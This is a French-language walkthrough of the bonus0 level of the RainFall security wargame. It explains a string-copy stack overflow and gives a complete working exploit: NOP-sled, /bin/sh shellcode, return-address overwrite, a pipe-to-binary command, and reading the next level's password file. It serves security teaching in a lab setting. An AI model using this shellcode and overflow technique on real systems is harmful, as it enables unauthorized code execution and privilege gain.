# RainFall — bonus0 : README Exploit Guide

## 🚀 TL;DR (Résumé en 5 lignes)

- Le programme lit deux lignes (`first`, `last`) et construit `fullname = first + " " + last`
- À cause d'un **mauvais combo `strncpy` + `strcpy` + `strcat`**, `fullname` **déborde** sa taille
- Ce débordement permet d'**écraser l'adresse de retour** (RET) sur la pile
- On **redirige l'exécution** vers un **grand tampon** (4096 o) de `p()` rempli de **NOPs** puis de **shellcode** (`/bin/sh`)
- Sur RainFall : **NX off / aucun canary / pas de PIE / ASLR off** → adresses stables, pile exécutable

---

## 📋 Ce que fait le programme

### Fonction `p(dst, " - ")`
- Lit jusqu'à **4096 octets** dans un **gros buffer local** `buf[4096]` (pile de `p`)
- Remplace `'\n'` par `'\0'`
- **Copie 20 octets max** vers `dst` via `strncpy(dst, buf, 20)`
- ⚠️ Si l'entrée fait **≥ 20 octets**, **`dst` n'est PAS `'\0'`-terminé** (comportement de `strncpy`)

### Fonction `pp(out)`
Appelle **deux fois** `p()` : d'abord `first`, puis `last`

### Fonction `main`
Construit `out` (= `fullname`) :
```c
strcpy(out, first);           // copie jusqu'au premier '\0'
out[strlen(out)] = ' ';
out[strlen(out)+1] = '\0';
strcat(out, last);            // recolle last
```

**Problème :** Si `first` n'a pas de `'\0'` (exactement 20 chars lus), `strcpy(out, first)` lit trop loin (avale le début de `last`). Puis `strcat(out, last)` rajoute `last` une 2ᵉ fois. `out` est trop petit → débordement jusqu'à la RET de `main`.

---

## 💡 Idée de l'exploit

1. **1ʳᵉ ligne :** Remplir le gros buffer `buf[4096]` de `p()` avec beaucoup de NOPs (`\x90`) puis un shellcode (lance `/bin/sh`)

2. **2ᵉ ligne :** Provoquer le débordement et écraser la RET par une adresse au milieu des NOPs → le CPU "glisse" (NOP-sled) vers le shellcode → shell

**Pourquoi ça marche ici ?** NX off, pas de canary, pas de PIE, ASLR off.

---

## 🔍 Où l'overflow se produit

`first` non `'\0'`-terminé (20 octets pile) ⇒ `strcpy(out, first)` continue à lire en mémoire (englobe le début de `last`) jusqu'au prochain `'\0'`.

Puis le code ajoute un espace et concatène `last` une seconde fois :

```
out = first + (début de last) + ' ' + last
```

`out` est trop petit → écriture au-delà → on atteint la RET (adresse de retour) sur la pile.

---

## 🎯 Mesures & adresses (en GDB)

### Adresse du gros buffer `buf[4096]` de `p()`

```bash
gdb ./bonus0
(gdb) set disassembly-flavor intel
(gdb) disass p
# Repère :  lea eax, [ebp-0x1008]   ← début du buffer local
(gdb) b *p+28                        # (dans ce binaire, la 'lea' est à +28)
(gdb) run
(gdb) x $ebp-0x1008
0xbfffe680                            # ← début de buf (exemple réel RainFall)
```

On choisit une adresse-cible au milieu des NOPs :
```
target = 0xbfffe680 + 0x50 = 0xbfffe6d0
```

Little-endian (x86) : `0xbfffe6d0` ⇒ `\xd0\xe6\xff\xbf`

### Offset d'écrasement de la RET (EIP)

Avec un pattern (type Aa0Aa1…) ou des 'A' + 4 'B', on vérifie que l'offset utile est **9** ici :

Le 10ᵉ octet de la 2ᵉ ligne (celle qui déborde) arrive pile sur EIP.

---

## 🛡️ Shellcode & NOP-sled

### Shellcode `/bin/sh` (utilisé sur RainFall)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x89
\xc1\x89\xc2\xb0\x0b\xcd\x80\x31
\xc0\x40\xcd\x80
```

On le place juste après ~100 NOPs dans la 1ʳᵉ ligne (la NOP-sled).

---

## 🚀 Commande finale (exploit complet)

Avec les adresses mesurées ci-dessus :
- Début buf : `0xbfffe680`
- Cible au milieu des NOPs : `0xbfffe6d0` → `\xd0\xe6\xff\xbf`
- Offset EIP (2ᵉ ligne) : 9

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
```

Dans le shell obtenu :
```bash
whoami
cat /home/user/bonus1/.pass
```

### Astuce conversion Little-Endian
```python
python - <<'PY'
import struct
print struct.pack('<I', 0xbfffe6d0)
PY
```

---

## 📊 Schémas explicatifs

### Construction réelle de fullname
```
[first (20 sans '\0')][début de last]   ← strcpy copie trop
[  ' '  ]
[last encore]                            ← strcat ajoute encore
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              trop long → déborde jusqu'à la RET
```

### Détournement du flux
```
RET écrasée = 0xbfffe6d0  (au milieu des NOPs de buf)
               ↓
   NOP NOP NOP ... SHELLCODE  →  /bin/sh
```

---

## 🔧 Dépannage express

### Segfault immédiat ?
- Reprends l'adresse de buf dans CE run : `x $ebp-0x1008`
- Choisis la cible au milieu des NOPs et vérifie l'endianness (`\xd0\xe6\xff\xbf` pour `0xbfffe6d0`)

### Pas de shell ?
- Augmente la NOP-sled (ex. 200)
- Vérifie que la 2ᵉ ligne écrase EIP à l'offset 9

### Adresses qui "bougent" ?
- Sur RainFall elles sont stables (ASLR off)
- Si variation, re-mesure buf avant d'attaquer

---

## 📚 Vocabulaire (mini glossaire)

- **Pile (stack)** : Variables locales + adresse de retour d'une fonction
- **RET / EIP** : Où le CPU retourne / quelle instruction il exécute. Les écraser → détourner le flux
- **Shellcode** : Petit code machine (ici lance `/bin/sh`)
- **NOP-sled** : Rangée de `\x90` → tolère les erreurs d'adresse
- **NX/ASLR/PIE** : Protections mémoire (ici OFF)

---

## ⚖️ Avertissement légal

Ce document est fourni **uniquement à des fins éducatives** dans le cadre de l'apprentissage de la sécurité informatique. L'utilisation de ces techniques sur des systèmes sans autorisation explicite est **illégale** et peut constituer un délit. L'auteur décline toute responsabilité en cas d'usage malveillant.

---

*Document généré pour l'apprentissage de la sécurité informatique - Utilisez de manière responsable*